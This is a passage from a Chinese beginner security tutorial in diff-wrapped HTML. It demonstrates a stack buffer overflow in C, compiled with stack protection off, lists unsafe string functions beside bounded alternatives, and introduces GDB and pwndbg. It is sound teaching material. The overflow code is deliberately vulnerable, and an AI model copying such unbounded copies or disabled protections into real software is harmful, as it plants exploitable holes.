+<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="n">input</span><span class="p">);</span><span class="w">         </span><span class="c1">// ★ 不检查长度！直接把 input 复制到 buf</span>
+<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;buf 的内容: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">);</span>
+<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;buf 的地址: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">);</span>
+<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="w">    </span><span class="c1">// 函数返回时，从栈上取&quot;返回地址&quot;跳转</span>
+<a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a><span class="p">}</span>
+<a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a>
+<a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">normal</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;Hello&quot;</span><span class="p">;</span><span class="w">            </span><span class="c1">// 6 字节，安全</span>
+<a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">attack</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+<a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a><span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">attack</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;A&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">99</span><span class="p">);</span><span class="w">           </span><span class="c1">// 把 99 个 &#39;A&#39; 填进去</span>
+<a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a><span class="w">    </span><span class="n">attack</span><span class="p">[</span><span class="mi">99</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+<a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a>
+<a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;正常输入测试:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<a id="__codelineno-18-19" name="__codelineno-18-19" href="#__codelineno-18-19"></a><span class="w">    </span><span class="n">vulnerable</span><span class="p">(</span><span class="n">normal</span><span class="p">);</span><span class="w">                 </span><span class="c1">// OK，6 字节 &lt; 16</span>
+<a id="__codelineno-18-20" name="__codelineno-18-20" href="#__codelineno-18-20"></a>
+<a id="__codelineno-18-21" name="__codelineno-18-21" href="#__codelineno-18-21"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">溢出输入测试:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<a id="__codelineno-18-22" name="__codelineno-18-22" href="#__codelineno-18-22"></a><span class="w">    </span><span class="n">vulnerable</span><span class="p">(</span><span class="n">attack</span><span class="p">);</span><span class="w">                 </span><span class="c1">// 99 字节 &gt;&gt; 16！</span>
+<a id="__codelineno-18-23" name="__codelineno-18-23" href="#__codelineno-18-23"></a><span class="w">    </span><span class="c1">// 返地址被 &#39;A&#39; (0x41) 覆盖 → RIP 变成 0x4141414141414141</span>
+<a id="__codelineno-18-24" name="__codelineno-18-24" href="#__codelineno-18-24"></a><span class="w">    </span><span class="c1">// → CPU 尝试跳转到这个地址 → 段错误！</span>
+<a id="__codelineno-18-25" name="__codelineno-18-25" href="#__codelineno-18-25"></a>
+<a id="__codelineno-18-26" name="__codelineno-18-26" href="#__codelineno-18-26"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;这行永远不会执行——因为程序已经崩溃了</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<a id="__codelineno-18-27" name="__codelineno-18-27" href="#__codelineno-18-27"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<a id="__codelineno-18-28" name="__codelineno-18-28" href="#__codelineno-18-28"></a><span class="p">}</span>
+</code></pre></div>
+<p>保存为 <code>overflow.c</code>，编译运行：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>gcc<span class="w"> </span>-fno-stack-protector<span class="w"> </span>-o<span class="w"> </span>overflow<span class="w"> </span>overflow.c
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="c1"># -fno-stack-protector 关掉栈保护，否则编译器会阻止你看到效果</span>
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>./overflow
+</code></pre></div>
+<p>你会看到：正常输入没问题，溢出输入后程序崩溃——"Segmentation Fault (core dumped)"。</p>
+<h3 id="_22">🧪 小实验<a class="headerlink" href="#_22" title="Permanent link">&para;</a></h3>
+<ol>
+<li>把 <code>buf[16]</code> 改成 <code>buf[32]</code>，重新编译运行。溢出了吗？（调整 attack 长度试试）</li>
+<li>把 <code>strcpy</code> 换成 <code>strncpy(buf, input, 16)</code>，重新编译运行。还崩溃吗？</li>
+<li>把 memset 的 'A' 改成 'B'（0x42），崩溃时的 RIP 从 <code>0x414141...</code> 变成了什么？</li>
+</ol>
+<hr />
+<h2 id="5">5. 📌 网安必知的几个危险函数<a class="headerlink" href="#5" title="Permanent link">&para;</a></h2>
+<h3 id="_23">🏪 生活场景：不看刻度线的杯子<a class="headerlink" href="#_23" title="Permanent link">&para;</a></h3>
+<p>你有一个容量 200 毫升的杯子。倒水的时候：
+- <strong>安全做法：</strong> 看着刻度线，到 200ml 就停
+- <strong>gets/strcpy 的做法：</strong> 闭着眼睛倒，倒多少算多少。水壶里有 500ml？全倒进去！杯子满了？溢出来了！桌子湿了（栈溢出）！</p>
+<p>这就是 C 语言中危险函数的本质：<strong>它们不问你目标有多大，只管自己写多少。</strong></p>
+<h3 id="_24">💣 头号通缉犯完整档案<a class="headerlink" href="#_24" title="Permanent link">&para;</a></h3>
+<h4 id="1-gets">1. gets() —— 永远的罪魁祸首<a class="headerlink" href="#1-gets" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c1">// ❌ 危险：gets() 读取直到换行，不管 buf 多大</span>
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span><span class="w">   </span><span class="c1">// 用户输入 100 个字符 → 溢出 84 字节</span>
+<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>
+<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="c1">// ✅ 安全：fgets() 限制最大读取长度</span>
+<a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+<a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span><span class="w">  </span><span class="c1">// 最多读 15 个字符 + &#39;\0&#39;</span>
+</code></pre></div>
+<p><strong>为什么 gets 这么坏？</strong> 因为没有任何办法能让它安全。它只有一个参数——buf 的起始地址，根本不知道 buf 有多大。所以 C11 标准直接<strong>把 gets 从 C 语言中删除了</strong>。如果你的编译器还支持 gets，它应该给你一个警告。</p>
+<h4 id="2-strcpy">2. strcpy() —— 最常用的地雷<a class="headerlink" href="#2-strcpy" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c1">// ❌ 危险</span>
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="kt">char</span><span class="w"> </span><span class="n">dst</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="n">strcpy</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;This string is way too long for the buffer&quot;</span><span class="p">);</span>
+<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="c1">// dst 溢出！</span>
+<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>
+<a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="c1">// ✅ 安全</span>
+<a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="kt">char</span><span class="w"> </span><span class="n">dst</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+<a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="n">strncpy</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span><span class="w"> </span><span class="n">src</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span><span class="w">  </span><span class="c1">// 最多复制 7 个字符</span>
+<a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a><span class="n">dst</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;\0&#39;</span><span class="p">;</span><span class="w">         </span><span class="c1">// 手动确保以 \0 结尾</span>
+</code></pre></div>
+<h4 id="3-strcat">3. strcat() —— 拼接时溢出<a class="headerlink" href="#3-strcat" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="c1">// ❌ 危险</span>
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;Hello&quot;</span><span class="p">;</span><span class="w">       </span><span class="c1">// 已用 5 字节 + \0</span>
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="n">strcat</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="s">&quot; World!!!&quot;</span><span class="p">);</span><span class="w">     </span><span class="c1">// 想加 9 字节 → 溢出</span>
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>
+<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="c1">// ✅ 安全</span>
+<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a><span class="n">strncat</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="n">src</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+</code></pre></div>
+<h4 id="4-sprintf">4. sprintf() —— 格式化溢出<a class="headerlink" href="#4-sprintf" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="c1">// ❌ 危险</span>
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="n">sprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;用户输入: %s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">user_input</span><span class="p">);</span>
+<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>
+<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="c1">// ✅ 安全</span>
+<a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="n">snprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span><span class="w"> </span><span class="s">&quot;用户输入: %s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">user_input</span><span class="p">);</span>
+</code></pre></div>
+<h4 id="5-scanfs">5. scanf("%s") —— 默认不限制<a class="headerlink" href="#5-scanfs" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="c1">// ❌ 危险</span>
+<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">);</span><span class="w">        </span><span class="c1">// 读到空白符为止，不管多长</span>
+<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>
+<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="c1">// ✅ 安全</span>
+<a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%15s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">);</span><span class="w">      </span><span class="c1">// 明确限制最多读 15 个字符</span>
+</code></pre></div>
+<h3 id="_25">🛡️ 记住一条规律<a class="headerlink" href="#_25" title="Permanent link">&para;</a></h3>
+<p>安全的函数名字里带 "n"：<code>strncpy</code>、<code>strncat</code>、<code>snprintf</code>、<code>fgets</code></p>
+<p><strong>但 n 不是银弹：</strong>
+- 如果 <code>n</code> 算错了（比如写了 <code>sizeof(指针)</code> 而不是 <code>sizeof(数组)</code>），等于没设
+- <code>strncpy</code> 如果 src 比 n 短，会用 <code>\0</code> 填充剩余空间；如果 src 比 n 长，dst 不会以 <code>\0</code> 结尾——又是一个坑</p>
+<h3 id="_26">💻 双栏对比：每种函数的"被黑"版本和"安全"版本<a class="headerlink" href="#_26" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>
+<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="c1">// ===== gets 的对比 =====</span>
+<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="kt">void</span><span class="w"> </span><span class="nf">demo_gets</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+<a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;gets 版本（危险）——输入超过 15 个字符试试:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a><span class="w">    </span><span class="c1">// gets(buf);  // C11 已删除 gets，这里写出来只是演示</span>
+<a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a><span class="w">    </span><span class="c1">// 如果你的编译器还支持，你会看到溢出</span>
+<a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a>
+<a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;fgets 版本（安全）:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a><span class="w">    </span><span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span><span class="w">  </span><span class="c1">// 最多读 15 个字符</span>
+<a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;安全读入: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">);</span>
+<a id="__codelineno-25-14" name="__codelineno-25-14" href="#__codelineno-25-14"></a><span class="p">}</span>
+<a id="__codelineno-25-15" name="__codelineno-25-15" href="#__codelineno-25-15"></a>
+<a id="__codelineno-25-16" name="__codelineno-25-16" href="#__codelineno-25-16"></a><span class="c1">// ===== strcpy 的对比 =====</span>
+<a id="__codelineno-25-17" name="__codelineno-25-17" href="#__codelineno-25-17"></a><span class="kt">void</span><span class="w"> </span><span class="nf">demo_strcpy</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-25-18" name="__codelineno-25-18" href="#__codelineno-25-18"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">long_str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><span class="p">;</span><span class="w">  </span><span class="c1">// 32 个 A</span>
+<a id="__codelineno-25-19" name="__codelineno-25-19" href="#__codelineno-25-19"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buf1</span><span class="p">[</span><span class="mi">16</span><span class="p">],</span><span class="w"> </span><span class="n">buf2</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+<a id="__codelineno-25-20" name="__codelineno-25-20" href="#__codelineno-25-20"></a>
+<a id="__codelineno-25-21" name="__codelineno-25-21" href="#__codelineno-25-21"></a><span class="w">    </span><span class="c1">// 危险版本</span>
+<a id="__codelineno-25-22" name="__codelineno-25-22" href="#__codelineno-25-22"></a><span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">buf1</span><span class="p">,</span><span class="w"> </span><span class="n">long_str</span><span class="p">);</span><span class="w">  </span><span class="c1">// 溢出！buf1 只有 16 字节，但 long_str 有 32 个字符</span>
+<a id="__codelineno-25-23" name="__codelineno-25-23" href="#__codelineno-25-23"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;strcpy 结果: %s (已经溢出了！)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">buf1</span><span class="p">);</span>
+<a id="__codelineno-25-24" name="__codelineno-25-24" href="#__codelineno-25-24"></a>
+<a id="__codelineno-25-25" name="__codelineno-25-25" href="#__codelineno-25-25"></a><span class="w">    </span><span class="c1">// 安全版本</span>
+<a id="__codelineno-25-26" name="__codelineno-25-26" href="#__codelineno-25-26"></a><span class="w">    </span><span class="n">strncpy</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span><span class="w"> </span><span class="n">long_str</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+<a id="__codelineno-25-27" name="__codelineno-25-27" href="#__codelineno-25-27"></a><span class="w">    </span><span class="n">buf2</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+<a id="__codelineno-25-28" name="__codelineno-25-28" href="#__codelineno-25-28"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;strncpy 结果: %s (被截断，安全)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">buf2</span><span class="p">);</span>
+<a id="__codelineno-25-29" name="__codelineno-25-29" href="#__codelineno-25-29"></a><span class="p">}</span>
+</code></pre></div>
+<h3 id="_27">⚠️ 常见误区<a class="headerlink" href="#_27" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>❌ <strong>误区：</strong> "用了 strncpy 就安全了"
+✅ <strong>真相：</strong> 如果你的 n 写错了，等于没设。比如 <code>strncpy(dst, src, strlen(src))</code> 跟 <code>strcpy</code> 没有区别。关键是 <strong>n 必须反映目标缓冲区的大小</strong>，不是源的大小。</p>
+</blockquote>
+<hr />
+<h2 id="6-gdb-20">6. GDB 调试——20 分钟上手<a class="headerlink" href="#6-gdb-20" title="Permanent link">&para;</a></h2>
+<h3 id="_28">🏪 生活场景：给程序装监控摄像头<a class="headerlink" href="#_28" title="Permanent link">&para;</a></h3>
+<p>程序跑起来一眨眼就结束了。你想看它在每一步做了什么——这时候你需要一个调试器。<strong>GDB 就是程序的监控摄像头</strong>：你可以让程序暂停在某个位置，查看所有变量的值、寄存器的值、内存的内容，然后让它单步执行。</p>
+<p>就像你看球赛回放可以逐帧播放一样——GDB 让你逐指令播放程序。</p>
+<h3 id="_29">🔍 安装和启动<a class="headerlink" href="#_29" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="c1"># Linux (Debian/Ubuntu)</span>
+<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>gdb
+<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>
+<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="c1"># Mac</span>
+<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="c1"># 装好 Xcode Command Line Tools 就自带</span>
+<a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>
+<a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a><span class="c1"># Windows (MinGW)</span>
+<a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a><span class="c1"># MinGW 安装时勾选 gdb，或者用 WSL</span>
+<a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a>
+<a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a><span class="c1"># 安装 pwndbg 插件（强烈推荐！让 GDB 好看 100 倍）</span>
+<a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/pwndbg/pwndbg
+<a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a><span class="nb">cd</span><span class="w"> </span>pwndbg<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>./setup.sh
+</code></pre></div>
+<h3 id="gdb">💻 GDB 核心命令实操<a class="headerlink" href="#gdb" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="c1"># 准备一个带调试符号的程序</span>
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>gcc<span class="w"> </span>-g<span class="w"> </span>-fno-stack-protector<span class="w"> </span>-o<span class="w"> </span>vuln<span class="w"> </span>vuln.c
+<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="c1">#    ↑ -g 加入调试符号（变量名、行号）</span>
+<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="c1">#    ↑ -fno-stack-protector 关掉栈保护，方便观察溢出</span>
+<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>
+<a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a><span class="c1"># 启动 GDB</span>
+<a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a>gdb<span class="w"> </span>./vuln
+</code></pre></div>
+<p>进入 GDB 后的操作：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>(gdb) b main           # 在 main 函数入口打断点（breakpoint）
+<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>(gdb) r                # 运行程序（run）
+<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a># → 程序停在 main 的第一行
+<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>
+<a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>(gdb) n                # 执行下一行（next），不进入函数内部
+<a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>(gdb) s                # 执行下一行（step），会进入函数内部
+<a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a>
+<a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a>(gdb) p var            # 打印变量 var 的值（print）
+<a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a>(gdb) p &amp;var           # 打印变量 var 的地址
+<a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a>(gdb) p/x var          # 以十六进制格式打印
+<a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a>
+<a id="__codelineno-28-12" name="__codelineno-28-12" href="#__codelineno-28-12"></a>(gdb) i r              # 查看所有寄存器的值（info registers）
+<a id="__codelineno-28-13" name="__codelineno-28-13" href="#__codelineno-28-13"></a>(gdb) i r rsp rbp rip  # 只看指定的寄存器
+<a id="__codelineno-28-14" name="__codelineno-28-14" href="#__codelineno-28-14"></a>
+<a id="__codelineno-28-15" name="__codelineno-28-15" href="#__codelineno-28-15"></a>(gdb) x/16xw $rsp      # 查看栈顶 16 个字（十六进制，word=4字节）
+<a id="__codelineno-28-16" name="__codelineno-28-16" href="#__codelineno-28-16"></a>                        # x = examine（查看内存）
+<a id="__codelineno-28-17" name="__codelineno-28-17" href="#__codelineno-28-17"></a>                        # 16 = 显示 16 个单元
+<a id="__codelineno-28-18" name="__codelineno-28-18" href="#__codelineno-28-18"></a>                        # x = 十六进制格式
+<a id="__codelineno-28-19" name="__codelineno-28-19" href="#__codelineno-28-19"></a>                        # w = 以 word(4字节) 为单位
+<a id="__codelineno-28-20" name="__codelineno-28-20" href="#__codelineno-28-20"></a>
+<a id="__codelineno-28-21" name="__codelineno-28-21" href="#__codelineno-28-21"></a>(gdb) x/s 0x400123     # 把该地址处的数据当字符串显示
+<a id="__codelineno-28-22" name="__codelineno-28-22" href="#__codelineno-28-22"></a>
+<a id="__codelineno-28-23" name="__codelineno-28-23" href="#__codelineno-28-23"></a>(gdb) disas func       # 反汇编 func 函数
+<a id="__codelineno-28-24" name="__codelineno-28-24" href="#__codelineno-28-24"></a>(gdb) bt               # 查看调用栈（backtrace）
+<a id="__codelineno-28-25" name="__codelineno-28-25" href="#__codelineno-28-25"></a>
